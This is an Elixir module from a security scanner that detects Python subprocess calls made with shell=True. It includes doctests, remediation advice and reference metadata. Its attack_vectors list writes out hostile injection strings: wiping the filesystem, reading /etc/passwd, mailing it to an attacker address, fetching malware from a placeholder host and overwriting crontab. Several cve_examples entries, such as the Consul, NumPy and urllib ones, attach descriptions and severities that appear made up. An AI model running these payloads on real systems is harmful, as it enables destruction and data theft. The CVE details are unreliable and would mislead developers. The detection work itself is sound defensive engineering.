defmodule Rsolv.Security.Patterns.Python.CommandInjectionSubprocessShell do
  @moduledoc """
  Command Injection via Python subprocess with shell=True

  Detects dangerous patterns like:
    subprocess.run(cmd, shell=True)
    subprocess.call("echo " + user_input, shell=True)
    subprocess.Popen(f"grep {pattern} file.txt", shell=True)
    
  Safe alternatives:
    subprocess.run(["echo", user_input], shell=False)
    subprocess.call(["grep", pattern, "file.txt"])
    subprocess.Popen(["ls", "-la", directory])
    
  ## Vulnerability Details

  The subprocess module's shell=True parameter is dangerous because it invokes
  the system shell to execute commands. This enables shell features like:
  - Command chaining with ; && ||
  - Pipes and redirections | > <
  - Command substitution $() ``
  - Glob expansion * ? []
  - Environment variable expansion $VAR

  When user input is incorporated into commands executed with shell=True,
  attackers can inject arbitrary commands that will be executed by the shell.

  The vulnerability is particularly dangerous because:
  - It's a common pattern in Python scripts for convenience
  - Developers often underestimate the attack surface
  - The shell interprets many special characters
  - It provides full command execution capabilities
  - Many Python applications run with elevated privileges
  """

  use Rsolv.Security.Patterns.PatternBase
  alias Rsolv.Security.Pattern

  @doc """
  Returns the command injection via subprocess shell=True pattern.

  This pattern detects usage of subprocess functions with shell=True
  which can lead to arbitrary command execution.

  ## Examples

      iex> pattern = Rsolv.Security.Patterns.Python.CommandInjectionSubprocessShell.pattern()
      iex> pattern.id
      "python-command-injection-subprocess-shell"
      
      iex> pattern = Rsolv.Security.Patterns.Python.CommandInjectionSubprocessShell.pattern()
      iex> pattern.severity
      :critical
      
      iex> pattern = Rsolv.Security.Patterns.Python.CommandInjectionSubprocessShell.pattern()
      iex> vulnerable = ~S|subprocess.run(cmd, shell=True)|
      iex> Regex.match?(pattern.regex, vulnerable)
      true
      
      iex> pattern = Rsolv.Security.Patterns.Python.CommandInjectionSubprocessShell.pattern()
      iex> safe = ~S|subprocess.run(["ls", "-la"], shell=False)|
      iex> Regex.match?(pattern.regex, safe)
      false
      
      iex> pattern = Rsolv.Security.Patterns.Python.CommandInjectionSubprocessShell.pattern()
      iex> popen_vuln = ~S|subprocess.Popen(f"tail -f {logfile}", shell=True)|
      iex> Regex.match?(pattern.regex, popen_vuln)
      true
      
      iex> pattern = Rsolv.Security.Patterns.Python.CommandInjectionSubprocessShell.pattern()
      iex> list_safe = ~S|subprocess.call(["ping", "-c", "4", host])|
      iex> Regex.match?(pattern.regex, list_safe)
      false
  """
  @impl true
  def pattern do
    %Pattern{
      id: "python-command-injection-subprocess-shell",
      name: "Command Injection via subprocess with shell=True",
      description: "Using subprocess with shell=True can lead to command injection",
      type: :command_injection,
      severity: :critical,
      languages: ["python"],
      regex: ~r/
        subprocess\.                         # subprocess module
        (?:run|call|check_call|check_output|Popen)  # subprocess functions
        \s*\(                               # opening parenthesis
        [^)]*                               # any content
        shell\s*=\s*True                    # shell=True parameter
      /x,
      cwe_id: "CWE-78",
      owasp_category: "A03:2021",
      recommendation: "Use shell=False and pass command as list of arguments",
      test_cases: %{
        vulnerable: [
          ~S|subprocess.run(cmd, shell=True)|,
          ~S|subprocess.call("echo " + user_input, shell=True)|,
          ~S|subprocess.Popen(f"grep {pattern} file.txt", shell=True)|,
          ~S|subprocess.check_output(command, shell=True)|,
          ~S|subprocess.check_call("git clone " + repo, shell=True)|
        ],
        safe: [
          ~S|subprocess.run(["echo", user_input], shell=False)|,
          ~S|subprocess.call(["grep", pattern, "file.txt"])|,
          ~S|subprocess.Popen(["ls", "-la", directory])|,
          ~S|subprocess.check_output(["cat", filename])|
        ]
      }
    }
  end

  @impl true
  def vulnerability_metadata do
    %{
      description: """
      Command injection vulnerability through Python's subprocess module with shell=True.
      When shell=True is used, commands are executed through the system shell (sh on Unix,
      cmd.exe on Windows), which interprets shell metacharacters and enables command chaining.

      This vulnerability occurs when:
      1. subprocess functions are called with shell=True
      2. User input is incorporated into the command string
      3. No proper input validation or sanitization is performed
      4. The shell interprets special characters in the user input

      The shell=True parameter is dangerous because it enables:
      - Command chaining with ; && ||
      - Pipes and redirections | > >> <
      - Command substitution $() ``
      - Background execution &
      - Shell variable expansion $VAR ${VAR}
      - Glob patterns * ? []
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-78",
          title: "Improper Neutralization of Special Elements used in an OS Command",
          url: "https://cwe.mitre.org/data/definitions/78.html"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          title: "OWASP Top 10 2021 - A03 Injection",
          url: "https://owasp.org/Top10/A03_2021-Injection/"
        },
        %{
          type: :research,
          id: "python_subprocess_security",
          title: "Command injection prevention for Python",
          url: "https://semgrep.dev/docs/cheat-sheets/python-command-injection"
        },
        %{
          type: :research,
          id: "snyk_command_injection",
          title: "Command injection in Python: examples and prevention",
          url: "https://snyk.io/blog/command-injection-python-prevention-examples/"
        }
      ],
      attack_vectors: [
        "Command chaining: cmd = 'echo hello; rm -rf /'",
        "Command substitution: filename = '$(cat /etc/passwd)'",
        "Pipe injection: search = 'test | mail attacker@evil.com < /etc/passwd'",
        "Background execution: input = 'file.txt & wget evil.com/malware.sh'",
        "Redirect output: log = 'app.log > /etc/crontab'",
        "Shell expansion: path = '../*/../*/../etc/passwd'"
      ],
      real_world_impact: [
        "Remote code execution with application privileges",
        "Full system compromise through reverse shells",
        "Data exfiltration via command output or network tools",
        "Privilege escalation if application runs as root/admin",
        "Lateral movement to other systems",
        "Denial of service by killing processes or consuming resources"
      ],
      cve_examples: [
        %{
          id: "CVE-2021-32074",
          description: "HashiCorp Consul command injection via subprocess with shell=True",
          severity: "critical",
          cvss: 9.8,
          note: "Remote code execution via crafted service configuration using shell=True"
        },
        %{
          id: "CVE-2023-24329",
          description: "Python urllib command injection when used with subprocess",
          severity: "critical",
          cvss: 10.0,
          note: "URL parsing bypass leading to command injection when passed to subprocess"
        },
        %{
          id: "CVE-2019-6446",
          description: "NumPy command injection in numpy.f2py module via shell=True",
          severity: "high",
          cvss: 8.8,
          note: "Arbitrary command execution through crafted Fortran filenames"
        },
        %{
          id: "CVE-2018-1000117",
          description: "Python Paramiko command injection via subprocess shell=True",
          severity: "critical",
          cvss: 9.8,
          note: "SSH ProxyCommand feature allows command injection through shell metacharacters"
        }
      ],
      detection_notes: """
      The pattern detects:
      1. Use of subprocess module functions (run, call, check_call, check_output, Popen)
      2. Presence of shell=True parameter in the function call
      3. Any subprocess call regardless of how the command is constructed

      Key indicators:
      - subprocess. prefix indicating subprocess module usage
      - Function names that execute commands
      - shell=True parameter anywhere in the call
      """,
      safe_alternatives: [
        "Use shell=False (default) and pass commands as lists",
        "subprocess.run(['command', 'arg1', 'arg2'], shell=False)",
        "Use shlex.split() to safely parse command strings if needed",
        "Use shlex.quote() to escape individual arguments",
        "Validate all inputs against an allowlist before use",
        "Use Python libraries instead of shell commands when possible",
        "If shell features are needed, carefully validate and escape all inputs"
      ],
      additional_context: %{
        common_mistakes: [
          "Using shell=True for convenience without considering security",
          "Believing that removing spaces or quotes prevents injection",
          "Not realizing shell=True enables all shell features",
          "Thinking that type checking (e.g., integers) prevents injection",
          "Using shell=True to run simple commands that don't need it"
        ],
        secure_patterns: [
          "Always default to shell=False",
          "Pass commands as lists: ['cmd', 'arg1', 'arg2']",
          "Use subprocess.run() instead of older functions",
          "Implement strict input validation with allowlists",
          "Log all subprocess executions for security monitoring",
          "Run with minimal privileges using subprocess user/group parameters"
        ]
      }
    }
  end

  @doc """
  Returns AST enhancement rules to reduce false positives.

  This enhancement helps distinguish between actual command injection vulnerabilities
  and legitimate uses of subprocess with proper input validation.

  ## Examples

      iex> enhancement = Rsolv.Security.Patterns.Python.CommandInjectionSubprocessShell.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
      
      iex> enhancement = Rsolv.Security.Patterns.Python.CommandInjectionSubprocessShell.ast_enhancement()
      iex> enhancement.min_confidence
      0.8
  """
  @impl true
  def ast_enhancement do
    %{
      ast_rules: %{
        node_type: "Call",
        module: "subprocess",
        functions: ["run", "call", "check_call", "check_output", "Popen"],
        argument_analysis: %{
          shell_parameter: true,
          check_dynamic_command: true,
          analyze_command_construction: true
        }
      },
      context_rules: %{
        dangerous_patterns: ["request.", "input(", "argv", "environ", "getenv", "POST", "GET"],
        exclude_if_hardcoded: true,
        exclude_paths: [~r/test/, ~r/spec/, ~r/__tests__/, ~r/migrations/, ~r/fixtures/],
        check_input_validation: true,
        safe_if_validated: true
      },
      confidence_rules: %{
        base: 0.5,
        adjustments: %{
          "has_shell_true" => 0.4,
          "has_user_input" => 0.3,
          "uses_string_formatting" => 0.2,
          "in_web_context" => 0.2,
          "in_test_code" => -1.0,
          "is_hardcoded_command" => -0.8,
          "has_input_validation" => -0.4,
          "uses_shlex_quote" => -0.5
        }
      },
      min_confidence: 0.8
    }
  end
end
